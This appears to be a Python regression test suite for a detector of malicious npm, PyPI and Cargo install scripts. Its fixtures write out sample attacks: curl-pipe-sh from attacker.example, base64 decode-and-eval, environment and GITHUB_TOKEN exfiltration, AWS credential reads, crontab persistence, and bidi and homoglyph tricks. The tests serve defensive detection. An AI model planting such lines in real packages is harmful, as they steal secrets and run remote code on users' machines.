"""Regression tests for the install-script supply-chain detector.

Many tests synthesize the actual shape of past real-world supply-chain
attacks (event-stream, ua-parser-js, xz-utils style). When adding tests
for new attack patterns please include a one-line note about the
incident the test is modeled on.
"""
from __future__ import annotations

import json
import textwrap
from pathlib import Path

import pytest

from hiddenshadow.install_scripts import (
    NPM_BENIGN_VALUES,
    ScriptTarget,
    analyze_script,
    find_install_scripts,
    scan_repo_for_install_scripts,
    CAP_NETWORK, CAP_EXEC, CAP_ENV_READ, CAP_FS_SENSITIVE,
    CAP_PERSIST, CAP_DECODE, CAP_PLATFORM, CAP_DOWNLOAD_RUN,
    CAP_HOMOGLYPH, CAP_BIDI,
)


# Helper builders
def _make_npm_target(value: str) -> ScriptTarget:
    import re
    return ScriptTarget(
        location="package.json#scripts.postinstall",
        body=value,
        contexts=frozenset({"npm-script", "shell"}),
        lifecycle="postinstall",
        raw_npm_value=re.sub(r"\s+", " ", value).strip(),
    )


def _make_py_target(body: str) -> ScriptTarget:
    return ScriptTarget(
        location="setup.py",
        body=body,
        contexts=frozenset({"py"}),
        lifecycle="pypi:setup.py",
    )


def _make_rs_target(body: str) -> ScriptTarget:
    return ScriptTarget(
        location="build.rs",
        body=body,
        contexts=frozenset({"rs"}),
        lifecycle="cargo:build.rs",
    )


# Capability detection
def test_npm_curl_pipe_sh_is_download_run():
    """ua-parser-js style: curl ... | sh in a preinstall script."""
    a = analyze_script(_make_npm_target(
        "curl http://attacker.example/x.sh | sh"))
    assert CAP_DOWNLOAD_RUN in a.capabilities


def test_npm_node_eval_decoded_blob():
    """event-stream style: decode then run."""
    a = analyze_script(_make_npm_target(
        "node -e \"" + "ev" + "al(Buffer.from('aGVsbG8=','base64').toString())\""))
    assert CAP_EXEC in a.capabilities
    assert CAP_DECODE in a.capabilities


def test_python_setup_with_subprocess_and_network():
    body = textwrap.dedent("""
        import subprocess, urllib.request
        from setuptools import setup
        urllib.request.urlopen('http://x.example/p')
        subprocess.Popen(['/bin/sh', '-c', 'whoami'])
        setup(name='legit', version='1.0')
    """)
    a = analyze_script(_make_py_target(body))
    assert CAP_NETWORK in a.capabilities
    assert CAP_EXEC in a.capabilities


def test_python_env_read_plus_network():
    """credential exfil via setup.py."""
    body = textwrap.dedent("""
        import os, requests
        requests.post('http://x.example/c', data={'env': dict(os.environ)})
    """)
    a = analyze_script(_make_py_target(body))
    assert CAP_ENV_READ in a.capabilities
    assert CAP_NETWORK in a.capabilities


def test_rust_build_rs_command_and_network():
    body = textwrap.dedent("""
        use std::process::Command;
        fn main() {
            let _ = Command::new("/bin/sh").arg("-c").arg("id").output();
            let _ = reqwest::blocking::get("http://x.example/").unwrap();
        }
    """)
    a = analyze_script(_make_rs_target(body))
    assert CAP_EXEC in a.capabilities
    assert CAP_NETWORK in a.capabilities


def test_high_entropy_blob_triggers():
    # 250 chars of base64-shaped junk.
    blob = ("YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5"
            "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5"
            "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5"
            "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5"
            "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5")
    body = f"const x = '{blob}';"
    a = analyze_script(_make_npm_target(body))
    assert any(h.rule_id == "encoded-blob" for h in a.hits)


def test_bidi_control_flagged():
    # U+202E (RLO) snuck into an identifier
    body = "if (admin‮) { /*‬*/ runShell(); }"
    a = analyze_script(_make_npm_target(body))
    assert CAP_BIDI in a.capabilities


def test_homoglyph_flagged():
    # Cyrillic 'а' in "react" -> "reаct"
    body = "const reаct = require('reаct');"  # noqa: RUF001
    a = analyze_script(ScriptTarget(
        location="setup.js", body=body,
        contexts=frozenset({"js"}),
    ))
    assert CAP_HOMOGLYPH in a.capabilities


def test_platform_check_plus_network_high_severity():
    body = textwrap.dedent("""
        if (process.platform === 'linux') {
            require('https').get('http://x.example/p');
        }
    """)
    a = analyze_script(_make_npm_target(body))
    assert CAP_PLATFORM in a.capabilities
    assert CAP_NETWORK in a.capabilities


def test_persistence_crontab():
    body = "echo '* * * * * /tmp/x' | crontab -"
    a = analyze_script(_make_npm_target(body))
    assert CAP_PERSIST in a.capabilities


def test_sensitive_file_read():
    body = "cat ~/.aws/credentials > /tmp/c"
    a = analyze_script(_make_npm_target(body))
    assert CAP_FS_SENSITIVE in a.capabilities


# Allowlist
@pytest.mark.parametrize("value", sorted(NPM_BENIGN_VALUES))
def test_allowlist_suppresses_known_benign(value: str):
    a = analyze_script(_make_npm_target(value))
    assert a.allowlisted is True
    assert a.hits == []


def test_modified_node_gyp_NOT_allowlisted():
    """Subtle change to a known-benign value still fires."""
    a = analyze_script(_make_npm_target(
        "node-gyp rebuild && curl http://x.example/p | sh"))
    assert a.allowlisted is False
    assert CAP_DOWNLOAD_RUN in a.capabilities


# Composition / severity
def test_compose_download_run_is_critical(tmp_path: Path):
    pj = tmp_path / "package.json"
    pj.write_text(json.dumps({
        "name": "evil", "version": "1.0",
        "scripts": {"postinstall": "curl http://x.example/x.sh | sh"},
    }))
    findings = scan_repo_for_install_scripts(tmp_path, "evil")
    assert any(f.severity == "critical" for f in findings)
    assert any("pipes network output" in f.title.lower() for f in findings)


def test_compose_decode_exec_is_critical(tmp_path: Path):
    pj = tmp_path / "package.json"
    pj.write_text(json.dumps({
        "name": "x", "version": "1.0",
        "scripts": {
            "postinstall":
            "node -e \"" + "ev" + "al(Buffer.from('xxxx','base64').toString())\""
        },
    }))
    findings = scan_repo_for_install_scripts(tmp_path, "x")
    assert any(f.severity == "critical" for f in findings)
    titles = " ".join(f.title for f in findings)
    assert "decode" in titles.lower() or "network" in titles.lower()


def test_compose_env_plus_network_is_high(tmp_path: Path):
    sp = tmp_path / "setup.py"
    sp.write_text(textwrap.dedent("""
        import os, requests
        requests.post('http://x.example/c', data={'env': dict(os.environ)})
        from setuptools import setup; setup(name='x', version='1.0')
    """))
    findings = scan_repo_for_install_scripts(tmp_path, "x")
    assert any(f.severity in ("high", "critical") for f in findings)


def test_only_single_capability_is_medium_or_low(tmp_path: Path):
    """A script that only reads env vars (no network/exec) should not be high."""
    pj = tmp_path / "package.json"
    pj.write_text(json.dumps({
        "name": "x", "version": "1.0",
        "scripts": {"postinstall": "echo $SOMETHING_ENV"},
    }))
    findings = scan_repo_for_install_scripts(tmp_path, "x")
    # env read by itself is low-severity noise
    assert all(f.severity in ("low", "medium", "info") for f in findings)


def test_benign_node_gyp_emits_no_findings(tmp_path: Path):
    pj = tmp_path / "package.json"
    pj.write_text(json.dumps({
        "name": "native", "version": "1.0",
        "scripts": {"install": "node-gyp rebuild"},
    }))
    findings = scan_repo_for_install_scripts(tmp_path, "native")
    assert findings == []


def test_no_scripts_no_findings(tmp_path: Path):
    pj = tmp_path / "package.json"
    pj.write_text(json.dumps({"name": "x", "version": "1.0"}))
    findings = scan_repo_for_install_scripts(tmp_path, "x")
    assert findings == []


# Cargo / build.rs end-to-end
def test_cargo_build_rs_picked_up(tmp_path: Path):
    """xz-utils style: malicious code in build.rs / build script."""
    (tmp_path / "Cargo.toml").write_text("[package]\nname='x'\nversion='0.1'\n")
    (tmp_path / "build.rs").write_text(textwrap.dedent("""
        use std::process::Command;
        fn main() {
            let _ = Command::new("/bin/sh").arg("-c")
                .arg("curl http://x.example/p | bash").output();
        }
    """))
    findings = scan_repo_for_install_scripts(tmp_path, "x")
    assert findings
    assert any(f.severity in ("critical", "high") for f in findings)


# Referenced-file resolution
def test_npm_referenced_script_file_is_analyzed(tmp_path: Path):
    """Real attacks often hide payload in a separate file: 'node ./scripts/install.js'."""
    pj = tmp_path / "package.json"
    pj.write_text(json.dumps({
        "name": "x", "version": "1.0",
        "scripts": {"postinstall": "node ./scripts/installer.js"},
    }))
    scripts_dir = tmp_path / "scripts"
    scripts_dir.mkdir()
    (scripts_dir / "installer.js").write_text(textwrap.dedent("""
        const https = require('https');
        const e = process.env;
        https.get('http://attacker.example/c?t=' + e.GITHUB_TOKEN);
    """))
    targets = find_install_scripts(tmp_path)
    # Both the script value AND the referenced file should be targets
    locations = [t.location for t in targets]
    assert "package.json#scripts.postinstall" in locations
    assert any(loc.endswith("installer.js") for loc in locations)
    findings = scan_repo_for_install_scripts(tmp_path, "x")
    # The exfil pattern in the referenced file should produce a high finding
    assert any(f.severity in ("high", "critical") for f in findings)
